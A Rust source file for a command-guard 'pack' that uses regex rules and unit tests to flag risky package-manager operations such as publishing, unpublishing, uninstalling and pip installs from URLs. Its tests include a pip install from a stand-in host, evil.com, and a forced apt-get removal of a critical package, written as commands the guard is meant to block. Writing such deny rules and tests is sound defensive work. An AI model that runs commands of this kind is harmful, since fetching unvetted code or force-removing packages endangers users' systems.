//! Package Managers pack - protections for package manager commands.
//!
//! This pack provides protection against dangerous package manager operations:
//! - npm/yarn/pnpm publish without verification
//! - pip install from untrusted sources
//! - apt/yum remove critical packages
//! - cargo publish

use crate::packs::{DestructivePattern, Pack, SafePattern};
use crate::{destructive_pattern, safe_pattern};

/// Create the Package Managers pack.
#[must_use]
pub fn create_pack() -> Pack {
    Pack {
        id: "package_managers".to_string(),
        name: "Package Managers",
        description: "Protects against dangerous package manager operations like publishing \
                      packages and removing critical system packages",
        keywords: &[
            "npm", "yarn", "pnpm", "pip", "apt", "yum", "dnf", "cargo", "gem", "brew", "poetry",
            "mvn", "mvnw", "gradle", "gradlew", "publish",
        ],
        safe_patterns: create_safe_patterns(),
        destructive_patterns: create_destructive_patterns(),
        keyword_matcher: None,
        safe_regex_set: None,
        safe_regex_set_is_complete: false,
        default_effects: crate::packs::DEFAULT_PACK_EFFECTS,
    }
}

fn create_safe_patterns() -> Vec<SafePattern> {
    vec![
        // npm/yarn/pnpm install are generally safe
        safe_pattern!(
            "npm-install",
            r"\bnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:install|i|ci)(?=\s|$)"
        ),
        safe_pattern!(
            "yarn-add",
            r"\byarn\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:add|install)(?=\s|$)"
        ),
        safe_pattern!(
            "pnpm-install",
            r"\bpnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:add|install|i)(?=\s|$)"
        ),
        // list/info commands are safe
        safe_pattern!(
            "npm-list",
            r"\bnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|ls|info|view)(?=\s|$)"
        ),
        safe_pattern!(
            "yarn-list",
            r"\byarn\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|info|why)(?=\s|$)"
        ),
        // audit is safe
        safe_pattern!(
            "npm-audit",
            r"\bnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+audit(?=\s|$)"
        ),
        safe_pattern!(
            "yarn-audit",
            r"\byarn\b(?:\s+--?\S+(?:\s+\S+)?)*\s+audit(?=\s|$)"
        ),
        // pip list/show are safe
        safe_pattern!(
            "pip-list",
            r"\bpip\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|show|freeze)(?=\s|$)"
        ),
        // poetry show/info are safe
        safe_pattern!(
            "poetry-show",
            r"\bpoetry\b(?:\s+--?\S+(?:\s+\S+)?)*\s+show(?=\s|$)"
        ),
        safe_pattern!(
            "poetry-env-list",
            r"\bpoetry\b(?:\s+--?\S+(?:\s+\S+)?)*\s+env\s+list(?=\s|$)"
        ),
        // cargo build/test/check are safe
        safe_pattern!(
            "cargo-safe",
            r"\bcargo\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:build|test|check|clippy|fmt|doc|bench)\b"
        ),
        // apt list/show are safe
        safe_pattern!(
            "apt-list",
            r"\bapt\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|show|search)(?=\s|$)"
        ),
        safe_pattern!(
            "apt-get-list",
            r"\bapt-get\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:update|upgrade)(?!\s+.*-y)"
        ),
        // dry-run flags. Treat only bare `--dry-run` or explicit true
        // as previews; false-valued flags must not mask publish rules.
        safe_pattern!("npm-dry-run", r"\bnpm\b.*--dry-run(?:=true)?(?:\s|$)"),
        safe_pattern!("yarn-dry-run", r"\byarn\b.*--dry-run(?:=true)?(?:\s|$)"),
        safe_pattern!("pnpm-dry-run", r"\bpnpm\b.*--dry-run(?:=true)?(?:\s|$)"),
        safe_pattern!("cargo-dry-run", r"\bcargo\b.*--dry-run(?:=true)?(?:\s|$)"),
        safe_pattern!("poetry-dry-run", r"\bpoetry\b.*--dry-run(?:=true)?(?:\s|$)"),
    ]
}

fn create_destructive_patterns() -> Vec<DestructivePattern> {
    vec![
        // npm/yarn/pnpm publish
        destructive_pattern!(
            "npm-publish",
            r"\bnpm\b.*?\bpublish\b(?!.*--dry-run(?:=true)?(?:\s|$))",
            "npm publish releases a package publicly. Use --dry-run first."
        ),
        destructive_pattern!(
            "yarn-publish",
            r"\byarn\b.*?\bpublish\b(?!.*--dry-run(?:=true)?(?:\s|$))",
            "yarn publish releases a package publicly. Verify package.json first."
        ),
        destructive_pattern!(
            "pnpm-publish",
            r"\bpnpm\b.*?\bpublish\b(?!.*--dry-run(?:=true)?(?:\s|$))",
            "pnpm publish releases a package publicly."
        ),
        // npm unpublish. The `(?=\s|$)` trailing anchor ensures the
        // subcommand token ends at whitespace or end-of-string — otherwise
        // `npm install unpublish-helper` (a package literally named
        // `unpublish-helper`) would false-match.
        destructive_pattern!(
            "npm-unpublish",
            r"\bnpm\b.*?\bunpublish(?=\s|$)",
            "npm unpublish removes a published package. This can break dependent projects."
        ),
        // pip uninstall. Same trailing-anchor rule so installing a package
        // named `uninstall-tool` doesn't false-match the destructive rule.
        destructive_pattern!(
            "pip-uninstall",
            r"\bpip(?:3)?\b.*?\buninstall(?=\s|$)",
            "pip uninstall removes installed packages. Verify dependencies before removing."
        ),
        // pip install from URL (potential security risk)
        destructive_pattern!(
            "pip-url",
            r"\bpip\b.*?\binstall\s+.*(?:https?://|git\+)",
            "pip install from URL can install unvetted code. Verify the source first."
        ),
        // pip install --user or --system
        destructive_pattern!(
            "pip-system",
            r"\bpip\b.*?\binstall\s+.*--(?:system|target\s*/usr)",
            "pip install to system directories requires careful review."
        ),
        // apt remove/purge. Trailing `(?=\s|$)` so a package literally named
        // `remove-tool` doesn't false-match when installed via apt.
        destructive_pattern!(
            "apt-remove",
            r"\bapt(?:-get)?\b.*?\b(?:remove|purge|autoremove)(?=\s|$)",
            "apt remove/purge removes packages. Verify no critical packages are affected."
        ),
        // yum/dnf remove (same anchor logic as apt)
        destructive_pattern!(
            "yum-remove",
            r"\b(?:yum|dnf)\b.*?\b(?:remove|erase|autoremove)(?=\s|$)",
            "yum/dnf remove removes packages. Verify no critical packages are affected."
        ),
        // cargo publish
        destructive_pattern!(
            "cargo-publish",
            r"\bcargo\b.*?\bpublish\b(?!.*--dry-run(?:=true)?(?:\s|$))",
            "cargo publish releases a crate to crates.io. Use --dry-run first."
        ),
        // cargo yank. Same trailing anchor so a crate named `yank-helper`
        // doesn't false-match during install/build operations.
        destructive_pattern!(
            "cargo-yank",
            r"\bcargo\b.*?\byank(?=\s|$)",
            "cargo yank marks a version as unavailable. This can break dependent projects."
        ),
        // gem push
        destructive_pattern!(
            "gem-push",
            r"\bgem\b.*?\bpush\b",
            "gem push releases a gem to rubygems.org. Verify before publishing."
        ),
        // brew uninstall. `(?=\s|$)` so `brew install uninstall-helper` doesn't
        // false-match the destructive rule.
        destructive_pattern!(
            "brew-uninstall",
            r"\bbrew\b.*?\b(?:uninstall|remove)(?=\s|$)",
            "brew uninstall removes packages. Verify no dependent packages are affected."
        ),
        // poetry publish/remove
        destructive_pattern!(
            "poetry-publish",
            r"\bpoetry\b.*?\bpublish\b(?!.*--dry-run(?:=true)?(?:\s|$))",
            "poetry publish releases a package. Use --dry-run first."
        ),
        destructive_pattern!(
            "poetry-remove",
            r"\bpoetry\b.*?\bremove(?=\s|$)",
            "poetry remove uninstalls a dependency. Verify no critical packages are affected."
        ),
        // maven deploy / release
        destructive_pattern!(
            "maven-deploy",
            r"\b(?:mvn|mvnw)\b.*?\bdeploy\b",
            "mvn deploy publishes artifacts to a remote repository. Verify target repository."
        ),
        destructive_pattern!(
            "maven-release-perform",
            r"\b(?:mvn|mvnw)\s+.*release:perform\b",
            "mvn release:perform publishes a release. Verify version and repository."
        ),
        // gradle publish / release
        destructive_pattern!(
            "gradle-publish",
            r"\b(?:gradle|gradlew)\s+.*\bpublish\b",
            "gradle publish uploads artifacts. Use --dry-run first when possible."
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::packs::test_helpers::{
        assert_allows, assert_blocks, assert_blocks_with_pattern, assert_no_safe_match,
        assert_safe_pattern_matches,
    };

    #[test]
    fn package_manager_patterns_match_with_global_flags() {
        // Same class bug as every other CLI-prefix pack. Package
        // managers have mainline global flags:
        //   cargo --frozen publish
        //   cargo --offline --locked publish
        //   npm --registry=http://internal.corp/ publish
        //   pip --quiet install http://evil.com/pkg.tar.gz
        //   apt-get -o Dpkg::Options::="--force-yes" remove critical-pkg
        //   brew --verbose uninstall important
        let pack = create_pack();
        assert_blocks(&pack, "cargo --frozen publish", "publish");
        assert_blocks(&pack, "cargo --offline --locked publish", "publish");
        assert_blocks(
            &pack,
            "npm --registry=http://internal.corp/ publish",
            "publish",
        );
        assert_blocks(
            &pack,
            "pip --quiet install http://evil.com/pkg.tar.gz",
            "unvetted code",
        );
        assert_blocks(&pack, "brew --verbose uninstall important", "uninstall");
        assert_blocks(
            &pack,
            "cargo --frozen yank --version 1.0.0 my-crate",
            "yank",
        );
    }

    #[test]
    fn brew_uninstall_is_reachable_via_keywords() {
        let pack = create_pack();
        assert!(
            pack.might_match("brew uninstall wget"),
            "brew should be included in pack keywords to prevent false negatives"
        );
        let matched = pack
            .check("brew uninstall wget")
            .expect("brew uninstall should be blocked by package managers pack");
        assert_eq!(matched.name, Some("brew-uninstall"));
    }

    #[test]
    fn poetry_maven_gradle_and_pip_uninstall_block() {
        let pack = create_pack();
        assert_blocks(&pack, "poetry publish", "poetry publish");
        assert_blocks(&pack, "poetry remove requests", "poetry remove");
        assert_blocks(&pack, "mvn deploy", "mvn deploy");
        assert_blocks(&pack, "./mvnw release:perform", "release:perform");
        assert_blocks(&pack, "gradle publish", "gradle publish");
        assert_blocks(&pack, "./gradlew publish", "gradle publish");
        assert_blocks(&pack, "pip uninstall boto3", "pip uninstall");
        assert_blocks(&pack, "pip3 uninstall requests", "pip uninstall");
    }

    #[test]
    fn publish_dry_run_false_does_not_bypass_destructive_patterns() {
        let pack = create_pack();

        for command in [
            "npm publish --dry-run",
            "npm publish --dry-run=true",
            "yarn publish --dry-run",
            "pnpm publish --dry-run",
            "cargo publish --dry-run",
            "poetry publish --dry-run",
        ] {
            assert_allows(&pack, command);
            assert_safe_pattern_matches(&pack, command);
        }

        for (command, pattern) in [
            ("npm publish --dry-run=false", "npm-publish"),
            ("yarn publish --dry-run=false", "yarn-publish"),
            ("pnpm publish --dry-run=false", "pnpm-publish"),
            ("cargo publish --dry-run=false", "cargo-publish"),
            ("poetry publish --dry-run=false", "poetry-publish"),
            ("npm publish --dry-run=0", "npm-publish"),
            ("npm publish --no-dry-run", "npm-publish"),
        ] {
            assert_blocks_with_pattern(&pack, command, pattern);
            assert_no_safe_match(&pack, command);
        }
    }

    #[test]
    fn keyword_absent_skips_pack() {
        let pack = create_pack();
        assert!(!pack.might_match("echo hello"));
        assert!(pack.check("echo hello").is_none());
    }

    #[test]
    fn destructive_keyword_inside_package_name_does_not_false_match() {
        // The destructive subcommand token must end at a word-break that is
        // whitespace or end-of-string — mere `\b` (which includes hyphen
        // boundaries) false-matches package names like `uninstall-tool` or
        // `remove-cli` when they appear as install arguments.
        let pack = create_pack();
        assert!(
            pack.check("pip install uninstall-tool").is_none(),
            "pip install uninstall-tool must not false-match pip-uninstall"
        );
        assert!(
            pack.check("pip3 install uninstall-helper==1.0").is_none(),
            "pip3 install uninstall-helper must not false-match pip-uninstall"
        );
        assert!(
            pack.check("npm install unpublish-ci").is_none(),
            "npm install unpublish-ci must not false-match npm-unpublish"
        );
        assert!(
            pack.check("brew install remove-cli").is_none(),
            "brew install remove-cli must not false-match brew-uninstall"
        );
        assert!(
            pack.check("apt install remove-helper").is_none(),
            "apt install remove-helper must not false-match apt-remove"
        );
        assert!(
            pack.check("poetry add remove-lib").is_none(),
            "poetry add remove-lib must not false-match poetry-remove"
        );
        assert!(
            pack.check("cargo install yank-checker").is_none(),
            "cargo install yank-checker must not false-match cargo-yank"
        );

        // Sanity: the genuine destructive forms still block.
        assert_blocks(&pack, "pip uninstall boto3", "pip uninstall");
        assert_blocks(&pack, "brew uninstall wget", "brew uninstall");
        assert_blocks(&pack, "apt remove nginx", "apt remove");
        assert_blocks(&pack, "cargo yank --version 1.0 my-crate", "yank");
    }
}
